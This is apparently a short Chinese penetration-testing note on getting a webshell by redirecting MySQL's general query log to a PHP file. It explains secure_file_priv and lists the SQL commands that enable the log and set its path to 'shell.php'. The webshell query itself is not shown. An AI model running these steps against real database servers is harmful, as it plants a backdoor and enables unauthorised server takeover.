MySQL 日志文件 GetShell

MySQL 5.0 版本以上会创建日志文件，通过修改日志的全局变量打开日志并指定日志保存路径，在通过查询写入一句话木马，此时该木马会被日志记录并生成日志文件，从而 GetShell。

secure_file_priv 变量被用于限制导入和导出的数据目录，比如 LOAD DATA 和 SELECT ... INTO OUTFILE 语句以及 LOAD_FILE() 函数。

secure_file_priv 有些设置选项：

  • 如果为空，不做目录限制，即任何目录均可以。
  • 如果指定了目录，MySQL 会限制只能从该目录导入或导出该目录（该目录必须存在，MySQL 不会自动创建目录）。
  • 如果设置为 NULL，MySQL 服务器禁止导入与导出功能。
// 查询 select_file_priv
select @@secure_file_priv

// 查询日志全局变量
show global variables like '%general%'

// 打开日志保存功能
set global general_log = "ON"

// 设置日志文件保存路径
set global general_log_file = "xxxxx/shell.php"
